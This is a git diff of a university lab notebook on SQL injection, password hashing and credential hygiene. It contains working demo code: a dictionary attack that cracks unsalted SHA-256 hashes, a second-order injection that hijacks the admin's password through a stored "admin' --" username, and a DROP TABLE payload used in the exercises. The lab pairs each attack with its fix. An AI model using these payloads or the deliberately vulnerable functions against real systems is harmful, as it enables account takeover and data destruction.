+    "trustno1", "correct horse battery staple",
+]
 
-### The Solution: `.env` Files
+print("=== Dictionary attack against unsalted SHA-256 ===\n")
+t0 = time.time()
+cracked = {}
+for user, target in stolen.items():
+    for guess in wordlist:
+        if hashlib.sha256(guess.encode()).hexdigest() == target:
+            cracked[user] = guess
+            break
 
-```python
-# Step 1: Create a .env file (simulating what you'd create manually)
-env_content = """# Database credentials (NEVER commit this file)
-DB_HOST=localhost
-DB_PORT=5432
-DB_USER=postgres
-DB_PASSWORD=labpass
-DB_NAME=postgres
-"""
-
-with open(".env", "w") as f:
-    f.write(env_content)
-
-print("Created .env file")
-print("Contents:")
-with open(".env") as f:
-    for line in f:
-        line = line.strip()
-        if line and not line.startswith("#"):
-            key = line.split("=")[0]
-            print(f"  {key}=****")
+elapsed = time.time() - t0
+for user, pw in cracked.items():
+    print(f"  {user:7s} -> {pw!r}")
+print(f"\nCracked {len(cracked)}/{len(stolen)} in {elapsed*1000:.1f} ms.")
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected Output & Explanation</summary>
 
 ~~~text
-Created .env file
-Contents:
-  DB_HOST=****
-  DB_PORT=****
-  DB_USER=****
-  DB_PASSWORD=****
-  DB_NAME=****
+=== Dictionary attack against unsalted SHA-256 ===
+
+  admin   -> 'password123'
+  luis    -> 'qwerty'
+  maria   -> 'correct horse battery staple'
+  carlos  -> '123456'
+  sofia   -> 'hunter2'
+
+Cracked 5/5 in ~2 ms.
 ~~~
+
+**All five accounts cracked in milliseconds**, including the strong passphrase, because our wordlist happens to contain it. GPUs compute SHA-256 at billions of hashes per second. Against an unsalted general-purpose hash, any password that appears in any wordlist is effectively already cracked the moment the attacker gets the hash.
+
+</details>
+
+### Demo 2 — Salting breaks precomputation
+
+A **salt** is a random per-user value that gets mixed into the password before hashing. Same password, different salts → different hashes. Rainbow tables and shared precomputation no longer work.
+
+```python
+def hash_with_salt(password, salt):
+    return hashlib.sha256((salt + password).encode()).hexdigest()
+
+# Two users pick the exact same password
+salt_a = secrets.token_hex(16)
+salt_b = secrets.token_hex(16)
+h_a = hash_with_salt("password123", salt_a)
+h_b = hash_with_salt("password123", salt_b)
+
+print(f"salt A: {salt_a}\n   hash: {h_a}\n")
+print(f"salt B: {salt_b}\n   hash: {h_b}\n")
+print(f"Same password, different hashes: {h_a != h_b}")
+```
+
+<details>
+<summary>Expected Output & Explanation</summary>
+
+~~~text
+salt A: 3f2a91...
+   hash: 8e1a4c...
+salt B: 7b29ee...
+   hash: c4d810...
+
+Same password, different hashes: True
+~~~
+
+**What salting buys you:**
+
+*   A rainbow table (precomputed `password → hash` lookup) built without knowing the salt is useless.
+*   Two users with the same password have *different* stored hashes — so cracking one doesn't crack the other for free.
+*   The attacker must re-run the dictionary attack for *each user individually*, against *each user's salt*.
+
+What salting does **not** buy you: slowness. SHA-256 is still blazing fast; the attacker just does N times the work. Which brings us to iteration.
+
+</details>
+
+### Demo 3 — Iteration makes brute force economically infeasible
+
+`bcrypt` is designed to be slow, with a tunable **cost factor**. Each `+1` of cost roughly doubles the time per hash. On modern hardware, cost=12 takes ~250 ms per password. A GPU farm doing billions of SHA-256/sec is now doing *maybe a few thousand* bcrypt/sec per device.
+
+```python
+import bcrypt
+
+password = b"password123"
+
+# Cost factor 12 is typical for 2025 web apps
+t0 = time.time()
+hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
+single_hash_ms = (time.time() - t0) * 1000
+
+print(f"One bcrypt hash (cost=12): {single_hash_ms:.0f} ms")
+print(f"bcrypt output: {hashed.decode()[:40]}...  (includes salt + cost)")
+
+# Verify
+print(f"bcrypt.checkpw matches:    {bcrypt.checkpw(password, hashed)}")
+print(f"bcrypt.checkpw wrong pass: {bcrypt.checkpw(b'wrong', hashed)}")
+
+# Project how long a dictionary attack would take
+wordlist_size = 14_000_000  # order-of-magnitude of rockyou.txt
+print(f"\nBrute-force 14M-word list against ONE bcrypt hash: "
+      f"{wordlist_size * single_hash_ms / 1000 / 3600:.0f} hours on this CPU")
+```
+
+<details>
+<summary>Expected Output & Explanation</summary>
+
+~~~text
+One bcrypt hash (cost=12): ~250 ms
+bcrypt output: $2b$12$a3K9...                     (includes salt + cost)
+bcrypt.checkpw matches:    True
+bcrypt.checkpw wrong pass: False
+
+Brute-force 14M-word list against ONE bcrypt hash: ~970 hours on this CPU
+~~~
+
+**The full defense-in-depth picture:**
+
+| Scheme            | Dictionary attack against stolen hashes |
+|-------------------|-----------------------------------------|
+| Plaintext         | Already cracked. No "attack" needed.    |
+| SHA-256, unsalted | ~milliseconds for the whole user list (GPU: microseconds). Rainbow tables exist. |
+| SHA-256 + salt    | Still ~seconds per user on GPU. No shared precomputation.                         |
+| bcrypt (cost=12)  | Hours to weeks *per user* on a GPU farm. Strong passwords are effectively safe.   |
+| argon2id          | Same idea as bcrypt but memory-hard: resists GPU/ASIC acceleration. Modern default. |
+
+**The moral:** SQL injection is the breach you must prevent. Strong hashing is the dam that holds when prevention fails. Real systems need both — that's what "defense in depth" means.
+
+Note: for the rest of this lab we keep SHA-256 so the existing demos still work. Do not copy this choice into production code.
+
+</details>
+
+---
+
+## 6. Second-Order Injection
+
+Parameterized queries only help where you use them. Second-order injection is the version of the attack that fires **on a later query**, not the one that received the input. The malicious data is stored cleanly. Then some *other* code reads it back and concatenates it into a new query — and the bomb goes off.
+
+```python
+# Step 1: an attacker registers with a malicious username.
+# This INSERT is parameterized, so the string is stored LITERALLY. No injection here.
+malicious = "admin' --"
+cursor.execute(
+    "INSERT INTO users (id, username, email, password_hash, role) VALUES (%s, %s, %s, %s, %s)",
+    (99, malicious, "evil@attacker.example", sha256("doesntmatter"), "user"),
+)
+cursor.execute("SELECT id, username FROM users WHERE id = 99")
+print("Stored safely:", cursor.fetchone())
+```
+
+```python
+# Step 2: later, another piece of code reads that username back and
+# concatenates it into a new query — because the developer assumed
+# "it came from our own database, it must be safe."
+
+def reset_password_vulnerable(user_id, new_password_hash):
+    """
+    VULNERABLE: builds the UPDATE by string-concatenating a value that came from the DB.
+    """
+    cursor.execute("SELECT username FROM users WHERE id = %s", (user_id,))
+    stored_username = cursor.fetchone()[0]       # <-- attacker's payload
+
+    # The developer assumes the DB-sourced value is "clean." It isn't.
+    sql = (f"UPDATE users SET password_hash = '{new_password_hash}' "
+           f"WHERE username = '{stored_username}'")
+    print(f"  SQL sent: {sql}")
+    cursor.execute(sql)
+
+# Attacker triggers "reset my password" for their own account (id=99).
+# What actually happens: the UPDATE's WHERE clause is rewritten.
+new_hash = sha256("attacker_chosen_new_password")
+reset_password_vulnerable(user_id=99, new_password_hash=new_hash)
+
+# Check what actually changed
+cursor.execute("SELECT username, password_hash FROM users WHERE username = 'admin'")
+for row in cursor.fetchall():
+    print(f"  {row[0]:10s} hash={row[1][:16]}...")
+```
+
+<details>
+<summary>Expected Output & Explanation</summary>
+
+~~~text
+Stored safely: (99, "admin' --")
+
+  SQL sent: UPDATE users SET password_hash = '<attacker_hash>' WHERE username = 'admin' --'
+
+  admin      hash=<ATTACKER-CONTROLLED HASH>
+~~~
+
+**What happened:** the stored username is the string `admin' --`. When it's concatenated into the UPDATE, the rendered SQL becomes:
+
+~~~sql
+UPDATE users SET password_hash = '...' WHERE username = 'admin' --'
+~~~
+
+The `--` comments out the trailing `'` and anything after. The `WHERE` clause now matches the username `admin`, not the attacker's account. The attacker has just reset `admin`'s password to a value they chose.
+
+**The lesson:** *data gets tainted once and stays tainted.* Parameterize every query, not only the ones reading `request.form`. The database is not a sanitizer.
 
 </details>
 
 ```python
-# Step 2: Load .env into environment variables
+# Clean up the second-order demo before continuing
+cursor.execute("DELETE FROM users WHERE id = 99")
+# Restore admin's original hash
+cursor.execute("UPDATE users SET password_hash = %s WHERE username = 'admin'",
+               (sha256("password123"),))
+print("second-order demo cleaned up.")
+```
+
+---
+
+## 7. Secure Credential Management (brief)
+
+Even a perfectly parameterized app is compromised if its credentials leak. This is the second most common breach path after SQLi itself.
+
+### Anti-pattern
+
+~~~python
+# BAD: credentials visible in source code; if pushed to GitHub, compromised within minutes
+conn = psycopg2.connect(host="prod-db", user="admin", password="Pr0d_P@ss!", dbname="prod")
+~~~
+
+### Pattern: `.env` + `python-dotenv` + `.gitignore`
+
+```python
+# Step 1: create a .env file (normally done by hand; we write it here for the demo)
+with open(".env", "w") as f:
+    f.write(
+        "DB_HOST=localhost\n"
+        "DB_PORT=5432\n"
+        "DB_USER=postgres\n"
+        "DB_PASSWORD=labpass\n"
+        "DB_NAME=postgres\n"
+    )
+
+# Step 2: load it into os.environ
 load_dotenv(override=True)
 
-# Step 3: Read credentials from environment — never from the source code
-db_host = os.environ["DB_HOST"]
-db_port = os.environ["DB_PORT"]
-db_user = os.environ["DB_USER"]
-db_pass = os.environ["DB_PASSWORD"]
-db_name = os.environ["DB_NAME"]
-
-# Step 4: Connect using environment variables
+# Step 3: read credentials from the environment, never from source
 conn2 = psycopg2.connect(
-    host=db_host,
-    port=int(db_port),
-    user=db_user,
-    password=db_pass,
-    dbname=db_name
+    host=os.environ["DB_HOST"],
+    port=int(os.environ["DB_PORT"]),
+    user=os.environ["DB_USER"],
+    password=os.environ["DB_PASSWORD"],
+    dbname=os.environ["DB_NAME"],
 )
-cursor2 = conn2.cursor()
-cursor2.execute("SELECT current_user, current_database()")
-user, database = cursor2.fetchone()
-print(f"Connected as '{user}' to database '{database}'")
-print("Credentials loaded from .env — not visible in this code!")
-
-cursor2.close()
+cur2 = conn2.cursor()
+cur2.execute("SELECT current_user, current_database()")
+print("Connected as", cur2.fetchone())
+cur2.close()
 conn2.close()
 ```
 
@@ -528,206 +862,118 @@ conn2.close()
 <summary>Expected Output</summary>
 
 ~~~text
-Connected as 'postgres' to database 'postgres'
-Credentials loaded from .env — not visible in this code!
+Connected as ('postgres', 'postgres')
 ~~~
 
 </details>
 
-### The `.gitignore` Rule
+**Non-negotiable rules:**
 
-```python
-# Step 5: Always add .env to .gitignore
-gitignore_content = """# Environment variables — NEVER commit
-.env
-.env.local
-.env.production
-
-# Other sensitive files
-*.pem
-*.key
-credentials.json
-"""
-
-with open(".gitignore_example", "w") as f:
-    f.write(gitignore_content)
-
-print("=== .gitignore must include ===")
-print("  .env")
-print("  .env.local")
-print("  .env.production")
-print()
-print("If you accidentally commit credentials:")
-print("  1. Rotate the credential IMMEDIATELY (change the password)")
-print("  2. Remove from git history (git filter-branch or BFG Repo-Cleaner)")
-print("  3. Force push (only after rotating the credential)")
-```
-
-<details>
-<summary>Expected Output</summary>
-
-~~~text
-=== .gitignore must include ===
-  .env
-  .env.local
-  .env.production
-
-If you accidentally commit credentials:
-  1. Rotate the credential IMMEDIATELY (change the password)
-  2. Remove from git history (git filter-branch or BFG Repo-Cleaner)
-  3. Force push (only after rotating the credential)
-~~~
-
-</details>
+1. `.env` goes in `.gitignore`. Every time. No exceptions.
+2. If you commit a credential — even for a minute, even in a branch no one saw — **rotate it**. Removing the commit does not help; git history is forever, and bots scan GitHub commits in real time.
+3. Production secrets belong in a secret manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager) or in environment variables injected by the deployment system. `.env` is for local development only.
+4. **Least privilege for the DB user.** Our lab uses the `postgres` superuser because it's simple to set up. A real app should connect as a user whose permissions are exactly what the feature needs: `SELECT` on the tables it reads, nothing more. Least privilege doesn't prevent SQLi — but it caps the blast radius.
 
 ---
 
-## 7. Your Turn! (Exercises)
+## 8. Your Turn
 
-### Exercise 1: Secure Search Function
+### Exercise 1 — Harden an `INSERT`
 
-**Task:** The function below searches for users by a partial name match. It is **vulnerable** to SQL injection. Rewrite it using parameterized queries.
+The product-creation helper below is vulnerable. Rewrite it to use parameterized queries. Verify that an injection payload passed as `name` is stored as a literal string, not executed.
 
 ~~~python
-def search_users_vulnerable(search_term):
-    """VULNERABLE — rewrite this function."""
-    query = f"SELECT username, email, role FROM users WHERE username LIKE '%{search_term}%'"
-    cursor.execute(query)
-    return cursor.fetchall()
+def add_product_vulnerable(pid, name, description):
+    sql = (f"INSERT INTO products (id, name, description) "
+           f"VALUES ({pid}, '{name}', '{description}')")
+    cursor.execute(sql)
 ~~~
 
-**Hint:** For `LIKE` with parameterized queries, include the `%` wildcards in the parameter value, not in the SQL template: `cursor.execute("SELECT ... WHERE username LIKE %s", (f"%{search_term}%",))`
-
 ```python
-# TODO: Write search_users_secure(search_term) using parameterized queries
-
-# Test:
-# print(search_users_secure("a"))   # Should return ana, maria, carlos
-# print(search_users_secure("' OR '1'='1"))  # Should return empty list
+# TODO: write add_product_safe(pid, name, description) using parameterized queries.
+# TODO: call it with a benign product (pid=200, name='Test', description='demo')
+# TODO: call it with pid=201, name="'; DROP TABLE products; --", description='evil'
+# TODO: verify the products table still exists and count >= 12
 ```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Expected behavior</summary>
 
-~~~text
-Normal search for 'a':
-  [('ana', 'ana@upr.edu', 'admin'), ('maria', 'maria@upr.edu', 'user'), ('carlos', 'carlos@upr.edu', 'user')]
-
-Injection attempt "' OR '1'='1":
-  []
-~~~
+The malicious name is stored as the literal value `'; DROP TABLE products; --` — a weird but harmless string in the `name` column. The table survives. Count is 12.
 
 </details>
 
-### Exercise 2: Parameterized INSERT
+### Exercise 2 — Second-order injection, the fixed version
 
-**Task:** Write a `create_user(username, email, role)` function that safely inserts a new user. Use parameterized queries. Test it with both normal input and an injection attempt.
-
-**Hint:** `cursor.execute("INSERT INTO users (username, password, email, role) VALUES (%s, %s, %s, %s)", (username, 'temp_pass', email, role))`
+Rewrite `reset_password_vulnerable` from §6 so it is safe. The function must still read the username from the database, but the UPDATE must be parameterized.
 
 ```python
-# TODO: Write create_user(username, email, role) with parameterized INSERT
-# TODO: Test with normal input: create_user("pedro", "pedro@upr.edu", "user")
-# TODO: Test with injection: create_user("'; DROP TABLE users; --", "evil@hack.com", "admin")
-# TODO: Verify the table still exists and the injection string was stored as a literal username
+# TODO: reset_password_safe(user_id, new_password_hash)
+# Requirements:
+#   - SELECT the username using a parameterized query
+#   - UPDATE using a parameterized query that binds BOTH the hash AND the username
+#   - Replay the second-order attack from §6 and confirm admin's hash is NOT changed
 ```
 
-<details>
-<summary>Expected Output</summary>
+### Exercise 3 — Credential audit
 
-~~~text
-Created user: pedro
-Created user: '; DROP TABLE users; --
-
-All users still in table:
-  ana, luis, maria, carlos, sofia, pedro, '; DROP TABLE users; --
-
-Table intact: True (7 users)
-~~~
-
-The injection string is stored as a literal username — the SQL structure was never affected.
-
-</details>
-
-### Exercise 3: Credential Audit
-
-**Task:** Review the following code snippet and identify all security issues. List each vulnerability and how to fix it.
+Review this snippet and list every distinct security issue. Aim for at least four.
 
 ~~~python
 import psycopg2
-
-# Database connection
-conn = psycopg2.connect(
-    host="prod-db.company.com",
-    user="admin",
-    password="Pr0d_P@ssw0rd!",
-    dbname="customer_data"
-)
-cursor = conn.cursor()
-
-# Search for a customer
-customer_name = input("Enter customer name: ")
-cursor.execute(f"SELECT * FROM customers WHERE name = '{customer_name}'")
-results = cursor.fetchall()
-
-for row in results:
-    print(f"Name: {row[1]}, SSN: {row[2]}, Credit Card: {row[3]}")
+conn = psycopg2.connect(host="prod-db.company.com", user="admin",
+                        password="Pr0d_P@ssw0rd!", dbname="customers")
+cur = conn.cursor()
+name = input("name: ")
+cur.execute(f"SELECT id, name, ssn, credit_card FROM customers WHERE name = '{name}'")
+for row in cur.fetchall():
+    print(row)
 ~~~
-
-```python
-# TODO: List each vulnerability and its fix (as comments or print statements)
-# Hint: There are at least 4 distinct security issues
-```
 
 <details>
-<summary>Expected Output</summary>
+<summary>Discussion</summary>
 
-~~~text
-Security Issues Found:
-
-1. HARDCODED CREDENTIALS: Password "Pr0d_P@ssw0rd!" is in source code.
-   Fix: Use os.environ["DB_PASSWORD"] with a .env file.
-
-2. SQL INJECTION: f-string concatenation of customer_name into query.
-   Fix: cursor.execute("SELECT * FROM customers WHERE name = %s", (customer_name,))
-
-3. EXCESSIVE DATA EXPOSURE: Printing SSN and credit card numbers to console.
-   Fix: Only select/display necessary fields. Mask sensitive data (e.g., "****1234").
-
-4. NO PRINCIPLE OF LEAST PRIVILEGE: Using "admin" user for a search query.
-   Fix: Use a read-only database user with access only to needed tables/columns.
-~~~
+1. **Hardcoded production credentials** — password in source; move to env / secret manager; rotate if this file ever existed in git.
+2. **SQL injection** — f-string concatenation of `name`; use `%s` with parameters.
+3. **Excessive data exposure** — SSN and credit card printed to stdout; the query selects columns the feature doesn't need. Pull only what's necessary; mask PII (e.g., last 4 digits).
+4. **Superuser-level DB user** — `admin` for a read query breaks least privilege; a read-only user scoped to the `customers` table is correct.
+5. *(bonus)* No TLS settings shown — in production, `sslmode=require` or stronger belongs on the connection.
+6. *(bonus)* No logging of access to sensitive fields — regulated data (PCI, HIPAA) typically requires audit trails.
 
 </details>
 
 ---
 
-## 8. Cleanup
+## 9. Cleanup
 
 ```python
-# Clean up
+cursor.execute("DROP TABLE IF EXISTS products")
 cursor.execute("DROP TABLE IF EXISTS users")
 cursor.close()
 conn.close()
 
-# Remove the .env file we created
-import os
-for f in [".env", ".gitignore_example"]:
+for f in [".env"]:
     if os.path.exists(f):
         os.remove(f)
 
-print("Lab cleanup complete")
+print("lab cleanup complete")
 ```
 
 ---
 
 ## Summary
 
-In this lab, you:
-*   Built a **vulnerable login function** using string concatenation and exploited it with four types of SQL injection (authentication bypass, UNION data extraction, sensitive data leak, data destruction)
-*   Wrote a **secure login function** using **parameterized queries** (`%s` placeholders) that neutralized all injection attempts
-*   Observed that parameterized queries treat all user input as **literal data**, never as SQL commands
-*   Practiced **secure credential management** using `.env` files and `python-dotenv`
-*   Learned the `.gitignore` rule: credential files must never enter version control
+You performed, in sequence:
 
-**Next week:** You'll build a Data Access Layer (DAL) using connection pooling, the DAO pattern, and SQLAlchemy ORM — combining everything you've learned about secure, structured database access.
+1. **Filter bypass** with `' OR 1=1 --`
+2. **Column discovery** via `ORDER BY N` error messages
+3. **Type probing** with `UNION SELECT NULL, NULL, NULL` to confirm the `(int, text, text)` window
+4. **Exfiltration** of the `users` table through the `products` search slot
+5. **Destruction** via stacked `DROP TABLE`
+6. **Cracking** the stolen hashes with a dictionary attack; then watched salt and bcrypt defeat the same attack
+7. **Second-order injection** — malicious data stored safely, exploited later by a non-parameterized UPDATE
+8. **Credential hygiene** with `.env`, `.gitignore`, and the case for least-privileged DB users
+
+The red thread through every attack: **user input was treated as SQL grammar, not as data.** The red thread through every defense: **parameterize the query (first), and assume prevention will fail someday (hashing, least privilege, logging).**
+
+**Next:** Read [w11_l22_concept_data_security.md](w11_l22_concept_data_security.md) to formalize what you saw — the parser/binder mental model, the "restriction window," the OWASP Top 10, and why sanitization is not a substitute for parameterization. The concept file is the debrief; the lab was the experiment.
